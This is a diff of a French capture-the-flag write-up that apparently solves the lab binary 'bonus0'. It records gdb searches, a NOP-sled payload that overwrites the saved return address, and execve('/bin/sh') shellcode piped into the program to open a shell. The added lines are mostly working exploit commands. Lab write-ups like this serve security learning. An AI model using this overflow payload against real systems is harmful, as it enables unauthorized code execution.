@@ -136,31 +136,13 @@ La vulnérabilité est donc dans le fait qu'on peut écrire plus que la taille p
 
 --> En realite le buffer est ecrit en memoire, seulent 20 bytes sont copier dans le strncpy mais on s'en fou frerot
 
-r < <(python -c 'print "A"*20'; python -c 'print "B"*20')
 
+find /b 0xbfffe590, +2000, 0x6a, 0x0b, 0x58, 0x99, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x31, 0xc9, 0xcd, 0x80
 
-(gdb) find $esp, +1000, 0x41414141
-0xbffff706
-0xbffff707
-0xbffff708
-0xbffff709
-0xbffff70a
-0xbffff70b
-0xbffff70c
-0xbffff70d
-0xbffff70e
-0xbffff70f
-0xbffff710
-0xbffff711
-0xbffff712
-0xbffff713
-0xbffff714
-0xbffff715
-0xbffff716
-17 patterns found.
+Donc notre payload contient = 20 nops (pour le premier read) + 9 nops (pour atteindre saved eip du main(addr de retour)) + addr de notre shellcode + shellcode 
 
-find 0xbffdf000, +21000, 0x6a, 0x0b, 0x58, 0x99
+r < <(python -c 'print "\x90"*20' ; python -c 'print "\x90"*9 + "\xbb\xe5\xff\xbf" + "\x90" * 30 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 
-0xbffff62a
-
-r < <(python -c 'print "\x90"*20'; python -c 'print "\x90" * 9 +  "\x2a\xf6\xff\xbf" + 4*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+(python -c 'print "\x90"*20' ; python -c 'print "\x90"*9 + "\xbb\xe5\xff\xbf" + "\x90" * 30 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; cat) | ./bonus0
+0xbfffe5a1
+0xbfffe5bb
